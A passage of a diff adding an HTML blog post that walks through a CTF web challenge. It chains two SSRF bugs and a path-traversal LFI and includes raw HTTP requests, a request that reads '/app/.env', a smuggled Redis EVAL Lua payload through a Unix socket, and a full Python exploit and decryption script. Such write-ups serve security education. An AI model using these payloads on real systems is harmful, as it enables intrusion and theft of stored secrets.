+<span class="line"><span style="color:#E6EDF3">                    res.</span><span style="color:#D2A8FF">writeStatus</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">`${</span><span style="color:#E6EDF3">response</span><span style="color:#A5D6FF">.</span><span style="color:#E6EDF3">status</span><span style="color:#A5D6FF">} OK`</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">                    res.</span><span style="color:#D2A8FF">end</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">typeof</span><span style="color:#E6EDF3"> response.data </span><span style="color:#FF7B72">===</span><span style="color:#A5D6FF"> 'string'</span><span style="color:#FF7B72"> ?</span><span style="color:#E6EDF3"> response.data </span><span style="color:#FF7B72">:</span><span style="color:#79C0FF"> JSON</span><span style="color:#E6EDF3">.</span><span style="color:#D2A8FF">stringify</span><span style="color:#E6EDF3">(response.data));</span></span>
+<span class="line"><span style="color:#E6EDF3">                });</span></span>
+<span class="line"><span style="color:#E6EDF3">            }).</span><span style="color:#D2A8FF">catch</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">error</span><span style="color:#FF7B72"> =></span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#FF7B72">                if</span><span style="color:#E6EDF3"> (isAborted) </span><span style="color:#FF7B72">return</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">                res.</span><span style="color:#D2A8FF">cork</span><span style="color:#E6EDF3">(() </span><span style="color:#FF7B72">=></span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">                    res.</span><span style="color:#D2A8FF">writeStatus</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'502 Bad Gateway'</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">                    res.</span><span style="color:#D2A8FF">end</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">typeof</span><span style="color:#E6EDF3"> error.message </span><span style="color:#FF7B72">===</span><span style="color:#A5D6FF"> 'string'</span><span style="color:#FF7B72"> ?</span><span style="color:#E6EDF3"> error.message </span><span style="color:#FF7B72">:</span><span style="color:#79C0FF"> JSON</span><span style="color:#E6EDF3">.</span><span style="color:#D2A8FF">stringify</span><span style="color:#E6EDF3">(error.message));</span></span>
+<span class="line"><span style="color:#E6EDF3">                });</span></span>
+<span class="line"><span style="color:#E6EDF3">            });</span></span>
+<span class="line"><span style="color:#E6EDF3">        }</span></span>
+<span class="line"><span style="color:#E6EDF3">    })</span></span>
+<span class="line"><span style="color:#E6EDF3">});</span></span></code></pre>
+<p>One thing to note is that <code>allowAbsoluteUrls</code> are set to <code>false</code>, but in this version of Axios (1.8.1), <a href="https://github.com/axios/axios/issues/6463">that parameter is actually ignored</a>, rendering SSRF possible.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Phew, that was a long analysis! Let’s recap on what vulnerabilities we currently have:</p>
+<ol>
+<li>The Node application is vulnerable to SSRF where the Axios version used will ignore the <code>allowAbsoluteUrls</code> parameter, allowing attackers to access any resources through the <code>/api</code> endpoint.</li>
+<li>The main Nginx proxy is also vulnerable to SSRF since the subdomain and path is attacker-controlled with no sanitization.</li>
+<li>The certificate generation on the Python back-end is vulnerable to LFI since the <code>name</code> field is not sanitized.</li>
+</ol>
+<p>Great, now we need a plan to leak <code>wbc</code>’s data and decrypt them.</p>
+<p>To decrypt <code>wbc</code>’s data, we need the certifier and also the base key used on the Python back-end. Getting the certifier is easy, we just need to get the certificate for <code>wbc</code> using this request:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">POST</span><span style="color:#E6EDF3"> /api/v2/certificate </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> localhost</span></span>
+<span class="line"><span style="color:#7EE787">Content-Length</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> 6</span></span>
+<span class="line"><span style="color:#7EE787">sec-ch-ua-platform</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> "Linux"</span></span>
+<span class="line"><span style="color:#7EE787">Accept-Language</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> en-GB,en;q=0.9</span></span>
+<span class="line"><span style="color:#7EE787">sec-ch-ua</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> "Not)A;Brand";v="8", "Chromium";v="138"</span></span>
+<span class="line"><span style="color:#7EE787">Content-Type</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> application/x-www-form-urlencoded</span></span>
+<span class="line"><span style="color:#7EE787">sec-ch-ua-mobile</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> ?0</span></span>
+<span class="line"><span style="color:#7EE787">User-Agent</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span></span>
+<span class="line"><span style="color:#7EE787">Accept</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> */*</span></span>
+<span class="line"><span style="color:#7EE787">Origin</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> http://localhost</span></span>
+<span class="line"><span style="color:#7EE787">Sec-Fetch-Site</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> same-origin</span></span>
+<span class="line"><span style="color:#7EE787">Sec-Fetch-Mode</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> cors</span></span>
+<span class="line"><span style="color:#7EE787">Sec-Fetch-Dest</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> empty</span></span>
+<span class="line"><span style="color:#7EE787">Referer</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> http://localhost/</span></span>
+<span class="line"><span style="color:#7EE787">Accept-Encoding</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> gzip, deflate, br</span></span>
+<span class="line"><span style="color:#7EE787">Connection</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> keep-alive</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">name=wbc</span></span></code></pre>
+<p>Then we’ll get the certifier used, which is <code>Ak4gHIGV</code>.</p>
+<p><img src="/images/following_protocol/following_protocol_3.png" alt=""></p>
+<p>Now for getting the base key, we can leverage the LFI we found on the Python backend to leak the key from the <code>.env</code> filed stored in <code>/app/.env</code>. We can do that using this request:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">POST</span><span style="color:#E6EDF3"> /api/v2/certificate </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> localhost</span></span>
+<span class="line"><span style="color:#7EE787">Content-Length</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> 6</span></span>
+<span class="line"><span style="color:#7EE787">sec-ch-ua-platform</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> "Linux"</span></span>
+<span class="line"><span style="color:#7EE787">Accept-Language</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> en-GB,en;q=0.9</span></span>
+<span class="line"><span style="color:#7EE787">sec-ch-ua</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> "Not)A;Brand";v="8", "Chromium";v="138"</span></span>
+<span class="line"><span style="color:#7EE787">Content-Type</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> application/x-www-form-urlencoded</span></span>
+<span class="line"><span style="color:#7EE787">sec-ch-ua-mobile</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> ?0</span></span>
+<span class="line"><span style="color:#7EE787">User-Agent</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span></span>
+<span class="line"><span style="color:#7EE787">Accept</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> */*</span></span>
+<span class="line"><span style="color:#7EE787">Origin</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> http://localhost</span></span>
+<span class="line"><span style="color:#7EE787">Sec-Fetch-Site</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> same-origin</span></span>
+<span class="line"><span style="color:#7EE787">Sec-Fetch-Mode</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> cors</span></span>
+<span class="line"><span style="color:#7EE787">Sec-Fetch-Dest</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> empty</span></span>
+<span class="line"><span style="color:#7EE787">Referer</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> http://localhost/</span></span>
+<span class="line"><span style="color:#7EE787">Accept-Encoding</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> gzip, deflate, br</span></span>
+<span class="line"><span style="color:#7EE787">Connection</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> keep-alive</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">name=../../app/.env</span></span></code></pre>
+<p>From that request we can get the base key of <code>0cccaf41450b4c0ca95f1a9c</code>.</p>
+<p><img src="/images/following_protocol/following_protocol_4.png" alt=""></p>
+<p>Now for the hard part, getting the encrypted data of <code>wbc</code>.</p>
+<h4 id="chaining-two-ssrfs">Chaining two SSRFs</h4>
+<p>The reason why I like this challenge is because we are chaining two SSRFs together, which is something I have never seen before (granted, I haven’t done a lot of web challenges). As I said before, the major roadblock we have is that the Redis database is only exposed through a Unix socket. But, <code>proxy_pass</code> actually supports connecting to Unix sockets.</p>
+<p>So, the game plan is to use SSRF on the Node service to request to the <code>backend.wbc</code> URL that is vulnerable to the other SSRF that we need to connect to the Redis socket.</p>
+<p>Now let’s first think about what we want to run on the Redis instance. Since we may not be able to get the output of the command due to the different protocols used, I opted to save the encrypted data using the <code>img</code> key so that we can exfiltrate the data using the existing <code>img.backend.wbc</code> API.</p>
+<p>To ease the process of getting the data from <code>wbc</code> to the new <code>img</code> data, I used the <code>EVAL</code> command on Redis where it will execute Lua code. The command will look like this:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>EVAL redis.call('SET', 'img:&#x3C;some_random_number>', redis.call('HGET', 'wbc', 'voted_for'))" 0</span></span></code></pre>
+<p><code>redis.call</code> is pretty self-explanatory, where it would call a certain Redis command, in this case is <code>SET</code>. It will set the key of <code>img:&#x3C;some_random_number></code> with the data we get from <code>wbc</code> using <code>redis.call('HGET', 'wbc', 'voted_for')</code> . The <code>0</code> on the end of the command is just stating that we have zero arguments.</p>
+<p>Then we can just get the encrypted data using the <code>/api/img/&#x3C;some_random_number></code> endpoint.</p>
+<p>Great! We now know what to send to the Redis instance, but we still need to find out how to actually communicate to the Redis instance since we are using a different protocol from Redis.</p>
+<h4 id="following-the-redis-protocol-omg-title-of-the-challenge-">Following the Redis protocol (omg title of the challenge 😲)</h4>
+<p>To achieve this, we can modify our HTTP request to change the verb to <code>EVAL</code> and then putting our payload on the URL itself to resemble a Redis command. The resulting HTTP request will look like this:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>EVAL http://localhost/api/img/http://backend.wbc/unix:/redis/redis.sock:%22%20redis.call%28%27SET%27%2C%20%27img%3A162%27%2C%20redis.call%28%27HGET%27%2C%20%27wbc%27%2C%20%27voted_for%27%29%29%22%200</span></span></code></pre>
+<p>We are using the <code>/api/img</code> endpoint to use the Node SSRF that will go to <code>http://backend.wbc/</code> and then use the Nginx SSRF to connect to our Redis socket. Then the <code>EVAL</code> payload is URL encoded.</p>
+<p>Cool! Should work right? Well… not yet.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[crit] 7#7: *165 connect() to unix:/redis.backend.wbc/redis.sock failed (2: No such file or directory) while connecting to upstream, client: 172.18.0.6, server: backend.wbc, request: "EVAL /unix:/redis/redis.sock:%22%20redis.call%28%27SET%27%2C%20%27img%3A456%27%2C%20redis.call%28%27HGET%27%2C%20%27wbc%27%2C%20%27voted_for%27%29%29%22%200 HTTP/1.1", upstream: "http://unix:/redis.backend.wbc/redis.sock:" redis.call('SET', 'img:456', redis.call('HGET', 'wbc', 'voted_for'))" 0", host: "backend.wbc"</span></span></code></pre>
+<p>Bad news is the Nginx recognized the Unix socket path of our payload as the subdomain, therefore appending the <code>.backend.wbc</code> to our path. Easy fix tho, we can just add another <code>/</code> to our payload. I added a Lua comment block containing the <code>/</code> so that it would not affect the Lua script.</p>
+<p>Here is the Python code I used to craft and send the payload:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#8B949E"># Get voted_for</span></span>
+<span class="line"><span style="color:#79C0FF">IMG_NUMBER</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> random.randint(</span><span style="color:#79C0FF">100</span><span style="color:#E6EDF3">,</span><span style="color:#79C0FF">500</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#79C0FF">TEMPLATE</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> "/api/img/http://backend.wbc/unix:/redis/redis.sock:</span><span style="color:#FF7B72">\"</span><span style="color:#A5D6FF">--[[/]] </span><span style="color:#FF7B72">{}\"</span><span style="color:#A5D6FF"> 0"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">cmd </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"redis.call('SET', 'img:</span><span style="color:#FF7B72">{</span><span style="color:#79C0FF">IMG_NUMBER</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">', redis.call('HGET', 'wbc', 'voted_for'))"</span></span>
+<span class="line"><span style="color:#E6EDF3">payload </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> TEMPLATE</span><span style="color:#E6EDF3">.format(quote(cmd))</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">requests.request(</span><span style="color:#A5D6FF">"EVAL"</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">url</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">HOST</span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3">payload)</span></span></code></pre>
+<p>Now, we just need to create the whole script to get the encrypted data and decrypt it based on the certifier and the base key we got previously.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> requests</span></span>
+<span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> random</span></span>
+<span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> base64</span></span>
+<span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> urllib.parse </span><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> quote</span></span>
+<span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> Crypto.Cipher </span><span style="color:#FF7B72">import</span><span style="color:#79C0FF"> AES</span></span>
+<span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> Crypto.Util.Padding </span><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> unpad</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">HOST</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> "http://localhost"</span></span>
+<span class="line"><span style="color:#8B949E"># HOST = "http://3.105.27.130:8000"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">certifier </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "Ak4gHIGV"</span></span>
+<span class="line"><span style="color:#E6EDF3">encryption_key </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "0cccaf41450b4c0ca95f1a9c"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Get voted_for</span></span>
+<span class="line"><span style="color:#8B949E"># Save voted_for to an img</span></span>
+<span class="line"><span style="color:#79C0FF">IMG_NUMBER</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> random.randint(</span><span style="color:#79C0FF">100</span><span style="color:#E6EDF3">,</span><span style="color:#79C0FF">500</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#79C0FF">TEMPLATE</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> "/api/img/http://backend.wbc/unix:/redis/redis.sock:</span><span style="color:#FF7B72">\"</span><span style="color:#A5D6FF">--[[/]] </span><span style="color:#FF7B72">{}\"</span><span style="color:#A5D6FF"> 0"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">cmd </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"redis.call('SET', 'img:</span><span style="color:#FF7B72">{</span><span style="color:#79C0FF">IMG_NUMBER</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">', redis.call('HGET', 'wbc', 'voted_for'))"</span></span>
+<span class="line"><span style="color:#E6EDF3">payload </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> TEMPLATE</span><span style="color:#E6EDF3">.format(quote(cmd))</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">requests.request(</span><span style="color:#A5D6FF">"EVAL"</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">url</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">HOST</span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3">payload)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Exfiltrate img</span></span>
+<span class="line"><span style="color:#E6EDF3">res </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> requests.get(</span><span style="color:#79C0FF">HOST</span><span style="color:#FF7B72">+</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"/api/img/</span><span style="color:#FF7B72">{</span><span style="color:#79C0FF">IMG_NUMBER</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">voted_for </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> res.text</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Decrypt</span></span>
+<span class="line"><span style="color:#E6EDF3">key </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> certifier </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> encryption_key</span></span>
+<span class="line"><span style="color:#E6EDF3">key </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> key.encode()</span></span>
+<span class="line"><span style="color:#E6EDF3">data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> base64.b64decode(voted_for)</span></span>
+<span class="line"><span style="color:#E6EDF3">iv </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> data[:</span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">]</span></span>
+<span class="line"><span style="color:#E6EDF3">ct </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> data[</span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">:]</span></span>
+<span class="line"><span style="color:#E6EDF3">cipher </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> AES</span><span style="color:#E6EDF3">.new(key,  </span><span style="color:#79C0FF">AES</span><span style="color:#E6EDF3">.</span><span style="color:#79C0FF">MODE_CBC</span><span style="color:#E6EDF3">, iv)</span></span>
+<span class="line"><span style="color:#E6EDF3">padded </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> cipher.decrypt(ct)</span></span>
+<span class="line"><span style="color:#E6EDF3">flag </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> unpad(padded, </span><span style="color:#79C0FF">AES</span><span style="color:#E6EDF3">.block_size)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">print</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">flag</span><span style="color:#FF7B72">=}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">)</span></span></code></pre>
+<p>And with that we (finally) got the flag!</p>
+<p><img src="/images/following_protocol/following_protocol_5.png" alt=""></p></div></article><aside class="toc" aria-label="On this page"><p>On this page</p><ol><li class="nested"><a href="#challenge-description">Challenge Description</a></li><li class="nested"><a href="#flag">Flag</a></li><li class="nested"><a href="#source-analysis">Source Analysis</a></li><li class="nested"><a href="#exploitation">Exploitation</a></li></ol></aside></main><footer class="site-footer"><div><span>k3ng.xyz</span><span class="footer-note">2026</span></div></footer><script>
+      document.querySelector('.theme-toggle')?.addEventListener('click', () => {
+        const theme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
+        const updateTheme = () => {
+          document.documentElement.dataset.theme = theme;
+          localStorage.setItem('theme', theme);
+        };
+
+        if (document.startViewTransition) {
+          document.startViewTransition(updateTheme);
+          return;
+        }
+
+        document.documentElement.classList.add('theme-transition');
+        updateTheme();
+        setTimeout(() => document.documentElement.classList.remove('theme-transition'), 650);
+      });
+    </script></body></html>
